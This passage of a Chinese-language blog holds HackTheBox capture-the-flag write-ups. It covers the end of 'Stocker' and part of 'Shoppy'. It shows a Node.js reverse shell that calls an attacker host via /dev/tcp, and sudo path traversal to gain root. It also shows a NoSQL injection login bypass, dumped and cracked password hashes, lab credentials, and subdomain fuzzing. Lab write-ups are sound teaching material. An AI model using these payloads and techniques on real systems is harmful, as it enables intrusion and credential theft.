    (ALL) /usr/bin/node /usr/local/scripts/*.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°angooseç”¨æˆ·å¯æ‰§è¡Œ<code>/usr/bin/node /usr/local/scripts/*.js</code></p>
<p>é‚£æˆ‘ä»¬å°±å°è¯•åœ¨<code>/usr/local/scripts</code>ç›®å½•ä¸‹å†™ä¸€ä¸ªjsæ–‡ä»¶ï¼Œä½†å‘ç°åœ¨æ­¤ç›®å½•æ— å¯å†™æƒé™ï¼Œé‚£å°±ä¾ç„¶åœ¨angooseç”¨æˆ·çš„homeç›®å½•ä¸‹å†™<code>wa0er_rev.js</code>ï¼Œå†…å®¹æ˜¯åå¼¹shellï¼Œå¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">angoose@stocker:~$ vi wa0er_rev.js
require('child_process').exec("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.x.x/9898 0&gt;&amp;1'")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å¼€å¯ncç›‘å¬</p>
<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰§è¡Œï¼Œåˆšåˆšçš„åå¼¹shellæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/wa0er_rev.js 
[sudo] password for angoose: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315112610819.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315112846605.png" style="zoom: 67%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>HackTheBox Stockerï¼š<a href="https://infosecwriteups.com/stocker-hackthebox-machine-simple-writeup-2023-316497ed30f7">https://infosecwriteups.com/stocker-hackthebox-machine-simple-writeup-2023-316497ed30f7</a></p>
<p>HackTheBox Stockerï¼š<a href="https://blog.csdn.net/qq_45894840/article/details/128765294">https://blog.csdn.net/qq_45894840/article/details/128765294</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>NoSQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Shoppy</title>
    <url>/posts/9681db2a.html</url>
    <content><![CDATA[<h1 id="HTB-Shoppy"><a href="#HTB-Shoppy" class="headerlink" title="HTB-Shoppy"></a>HTB-Shoppy</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li><p>ä¿¡æ¯æ”¶é›†ç›®å½•æšä¸¾å¾—åˆ°<code>/login</code>é¡µé¢ï¼›</p>
</li>
<li><p>ä¸‡èƒ½å¯†ç ç™»å½•<code>/login</code>é¡µé¢ï¼›</p>
</li>
<li><p>å†æ¬¡ä¸‡èƒ½å¯†ç æ‹¿åˆ°<code>josh</code>è´¦æˆ·ï¼ˆésshè´¦æˆ·ï¼‰ï¼›</p>
</li>
<li><p>æšä¸¾å­åŸŸå¾—åˆ°<code>mattermost</code>å­åŸŸï¼›</p>
</li>
<li><p><code>josh</code>è´¦æˆ·ç™»å½•<code>mattermost</code>å­åŸŸå¹¶åˆ†æé¡µé¢æ‹¿åˆ°sshè´¦æˆ·ï¼›</p>
</li>
<li><p>è¿ä¸Šsshè´¦æˆ·<code>sudo -l</code>å‘ç°å¯æ‰§è¡Œæ–‡ä»¶ï¼›</p>
</li>
<li><p>é€†å‘åˆ†æå¯æ‰§è¡Œæ–‡ä»¶æ‹¿åˆ°<code>deploy</code>è´¦æˆ·ï¼›</p>
</li>
<li><p>dockerææƒè·å–rootæƒé™ã€‚</p>
</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapï¼ˆç”¨å¦‚ä¸‹ä¸¤æ­¥ï¼Œå…ˆæ‰«å…¨ç«¯å£ï¼Œå†æŒ‡å®šç«¯å£å®šå‘æ‰«ææœåŠ¡ã€ç‰ˆæœ¬ç›¸å…³ä¿¡æ¯ï¼Œæœ‰åŠ©äºæå‡æ‰«æé€Ÿåº¦ï¼‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -p- --min-rate 10000 10.129.92.247
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:15 EDT
Nmap scan report for 10.129.92.247
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat

Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -p 22,80,9093 -sCV 10.129.92.247
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:24 EDT
Nmap scan report for 10.129.92.247
Host is up (0.32s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Fri, 31 Mar 2023 08:24:50 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 15
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 15
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.8824e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.6212e-05
|     go_gc_d
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Fri, 31 Mar 2023 08:24:51 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 15
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 15
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.8824e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.6212e-05
|_    go_gc_d
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.91%I=7%D=3/31%Time=642698D4%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,152D,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Fri,\x2
SF:031\x20Mar\x202023\x2008:24:50\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles_
SF:total\x2015\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Count\
SF:x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applicatio
SF:n\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo_gc
SF:_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total_gc
SF:_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#\x
SF:20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_t
SF:otal_gc_cycles_total\x2015\n#\x20HELP\x20go_gc_duration_seconds\x20A\x2
SF:0summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collecti
SF:on\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_gc_d
SF:uration_seconds{quantile=\"0\"}\x202\.8824e-05\ngo_gc_duration_seconds{
SF:quantile=\"0\.25\"}\x207\.6212e-05\ngo_gc_d")%r(HTTPOptions,1A5A,"HTTP/
SF:1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\x
SF:20charset=utf-8\r\nDate:\x20Fri,\x2031\x20Mar\x202023\x2008:24:51\x20GM
SF:T\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\x
SF:20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20ru
SF:ntime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counter
SF:\ngo_gc_cycles_automatic_gc_cycles_total\x2015\n#\x20HELP\x20go_gc_cycl
SF:es_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_force
SF:d_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200\
SF:n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20all\
SF:x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_cycl
SF:es_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x2015\n#\x20HEL
SF:P\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20du
SF:ration\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_gc_d
SF:uration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x202
SF:\.8824e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x207\.6212e-05\n
SF:go_gc_d");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.77 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰ã€9093ï¼ˆcopycatï¼‰ï¼Œè·å¾—åŸŸå<code>shoppy.htb</code></p>
<p>å°†åŸŸåæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.129.92.247 shoppy.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨æ‰“å¼€<code>shoppy.htb</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401165340368.png" style="zoom: 67%;">

<p>æšä¸¾å­ç›®å½•</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100 -mc 200,302,301 -u http://shoppy.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,302,301
________________________________________________

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 413ms]
    * FUZZ: admin

[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 414ms]
    * FUZZ: images

[Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 417ms]
    * FUZZ: js

[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 435ms]
    * FUZZ: assets

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 441ms]
    * FUZZ: css

[Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 468ms]
    * FUZZ: login

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 323ms]
    * FUZZ: Admin

[Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 429ms]
    * FUZZ: Login

[Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 335ms]
    * FUZZ: fonts

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 327ms]
    * FUZZ: ADMIN

[Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 332ms]
    * FUZZ: exports

[Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 376ms]
    * FUZZ: 

[Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 330ms]
    * FUZZ: LOGIN

:: Progress: [20116/20116] :: Job [1/1] :: 282 req/sec :: Duration: [0:01:06] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æšä¸¾åˆ°çš„ç›®å½•ï¼Œ301çš„é¡µé¢éƒ½æ²¡ä¸œè¥¿ï¼Œ302çš„éƒ½é‡å®šå‘åˆ°<code>/login</code>ç›®å½•</p>
<h2 id="ä¸‰ã€ä¸‡èƒ½å¯†ç "><a href="#ä¸‰ã€ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‰ã€ä¸‡èƒ½å¯†ç "></a>ä¸‰ã€ä¸‡èƒ½å¯†ç </h2><p>è®¿é—®<code>shoppy.htb/login</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401165456260.png"></p>
<p>ç”¨æˆ·åè¾“å…¥å¦‚ä¸‹ï¼Œå¯†ç ä»»æ„ï¼ˆä¸‡èƒ½å¯†ç ï¼‰ï¼ŒæˆåŠŸç™»å½•</p>
<pre class="line-numbers language-none"><code class="language-none">admin'||'1==1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401170449987.png" style="zoom: 67%;">

<p>ç‚¹å‡»é¡µé¢å³ä¸Šè§’æœç´¢æ ‡ç­¾ï¼Œå†æ¬¡è¾“å…¥ä¸‡èƒ½å¯†ç ï¼Œå¼¹å‡ºå¦‚ä¸‹<code>Download export</code>æ ‡ç­¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401170711916.png"></p>
<p>ç‚¹å‡»<code>Download export</code>æ ‡ç­¾ï¼Œå¾—åˆ°ä¸¤ç»„è´¦æˆ·ï¼Œ<code>admin</code>å’Œ<code>josh</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401170855524.png" style="zoom: 80%;">

<pre class="line-numbers language-none"><code class="language-none">[{
	"_id": "62db0e93d6d6a999a66ee67a",
	"username": "admin",
	"password": "23c6877d9e2b564ef8b32c3a23de27b2"
},
{
	"_id": "62db0e93d6d6a999a66ee67b",
	"username": "josh",
	"password": "6ebcea65320589ca4f2f1ce039975995"
}]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç ´è§£hashï¼š<a href="https://crackstation.net/">https://crackstation.net/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401171153928.png"></p>
<pre class="line-numbers language-none"><code class="language-none">josh
remembermethisway<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç”¨è¯¥è´¦æˆ·ç™»å½•sshï¼Œä¸å¯¹</p>
<p>é‚ç”¨wfuzzæšä¸¾å­åŸŸåï¼Œå‘ç°å¾ˆå¤š301</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# wfuzz -u http://10.129.92.247 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt             
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://10.129.92.247/
Total requests: 4989
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================
000000001:   301        7 L      11 W       169 Ch      "www"
000000020:   301        7 L      11 W       169 Ch      "www2"
000000019:   301        7 L      11 W       169 Ch      "dev"
000000015:   301        7 L      11 W       169 Ch      "ns"
000000003:   301        7 L      11 W       169 Ch      "ftp"
000000021:   301        7 L      11 W       169 Ch      "ns3"
000000022:   301        7 L      11 W       169 Ch      "pop3"
000000018:   301        7 L      11 W       169 Ch      "blog"
......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å†ç”¨ffufæé€Ÿæšä¸¾å­åŸŸåï¼ˆwfuzzè¿™ä¸ªé€Ÿåº¦æœ‰ç‚¹çª’æ¯ï¼Œç”¨ffufæˆ–gobusteræé€Ÿï¼‰ï¼Œå¹¶ä¸”æ¢ä¸ªå¤§å­—å…¸ï¼Œè¿‡æ»¤301å“åº”</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.129.92.247 -H "Host: FUZZ.shoppy.htb" -fc 301 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.92.247
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

[Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 318ms]
    * FUZZ: mattermost

:: Progress: [100000/100000] :: Job [1/1] :: 100 req/sec :: Duration: [0:13:49] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°<code>mattermost</code>å­åŸŸåï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.129.92.247 mattermost.shoppy.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®<code>mattermost.shoppy.htb</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401171708091.png" style="zoom: 80%;">

<p>ç”¨åˆšåˆšçš„<code>josh</code>è´¦æˆ·ç™»å½•ï¼Œåœ¨å·¦ä¾§<code>Deploy Machine</code>æ ï¼ŒèŠå¤©è®°å½•é‡Œå‘ç°<code>jaeger</code>è´¦æˆ·</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401172244603.png" style="zoom:80%;">

<pre class="line-numbers language-none"><code class="language-none">username: jaeger
password: Sh0ppyBest@pp!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>sshè¿ä¸Šï¼ˆIPæœ‰å˜åŒ–æ˜¯å› ä¸ºé‡å¯äº†é¶æœºç¯å¢ƒï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ssh jaeger@10.129.93.16
jaeger@10.129.93.16's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$ id
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
jaeger@shoppy:~$ pwd
/home/jaeger<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨<code>sudo -l</code>æŸ¥çœ‹æ­¤ç”¨æˆ·æƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°å¯æ‰§è¡Œå‘½ä»¤<code>/home/deploy/password-manager</code>ï¼Œç”¨å¦‚ä¸‹æ­¥éª¤ä¸‹è½½åˆ°æœ¬åœ°</p>
<p>åœ¨sshçª—å£å¼€å¯httpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">jaeger@shoppy:/home/deploy$ python3 -m http.server 9898
Serving HTTP on 0.0.0.0 port 9898 (http://0.0.0.0:9898/) ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç„¶ååœ¨æœ¬åœ°ç”¨å¦‚ä¸‹å‘½ä»¤ä¸‹è½½</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.129.93.16:9898/password-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°ç”¨<code>file</code>å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# file password-manager
password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ˜¯64ä½ELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶</p>
<h2 id="å››ã€é€†å‘åˆ†æ"><a href="#å››ã€é€†å‘åˆ†æ" class="headerlink" title="å››ã€é€†å‘åˆ†æ"></a>å››ã€é€†å‘åˆ†æ</h2><p>ç”¨<code>radare2</code>å·¥å…·é€†å‘é™æ€åˆ†æä¸€ä¸‹</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_28429161/article/details/107810534">https://blog.csdn.net/qq_28429161/article/details/107810534</a></p>
<pre class="line-numbers language-none"><code class="language-none">r2 password-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¾“å…¥å¦‚ä¸‹æŒ‡ä»¤ï¼Œå®šä½<code>main</code>å‡½æ•°åœ°å€</p>
<pre class="line-numbers language-none"><code class="language-none">&gt; aaa	#è‡ªåŠ¨åˆ†æå¹¶å‘½åå‡½æ•°
&gt; afl	#æŸ¥çœ‹ç¨‹åºå†…çš„å‡½æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401174620711.png"></p>
<p>æ‰¾åˆ°<code>main</code>å‡½æ•°ï¼Œç„¶åå®šä½åˆ°mainå‡½æ•°çš„åœ°å€å¹¶æŸ¥çœ‹æ±‡ç¼–ä»£ç </p>
<pre class="line-numbers language-none"><code class="language-none">&gt; s main  //å®šä½åˆ°mainå‡½æ•°å…¥å£
&gt; pdf  //æŸ¥çœ‹å½“å‰å‡½æ•°çš„æ±‡ç¼–ä»£ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401174843635.png"></p>
<p>å¦‚ä¸Šå›¾ï¼Œ<code>int main()</code>å’ŒåŸŸè¿ç®—ç¬¦<code>::</code>è¡¨æ˜è¿™æ˜¯C++ç¨‹åºï¼Œè¿è¡Œä¼šå…ˆæ‰“å°<code>Welcome to Josh password manager!</code></p>
<p>ç„¶åæ‰“å°<code>Please enter your master password:   </code> ï¼Œå¹¶æ¥æ”¶é”®ç›˜è¾“å…¥ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401195552726.png"></p>
<p>ç„¶åå°†é”®ç›˜è¾“å…¥ä¸<code>Sample</code>é€ä¸€å­—ç¬¦å¯¹æ¯”</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401195732987.png"></p>
<p>å¯¹æ¯”ç›¸åŒåï¼Œä¼šæ‰“å°<code>Access granted! Here is creds !</code>ï¼Œç„¶åè°ƒç”¨<code>system()</code>å‡½æ•°æ‰§è¡Œ<code>cat</code>å‘½ä»¤ï¼ŒæŸ¥çœ‹<code>/home/deploy/creds.txt</code>å†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401200157303.png"></p>
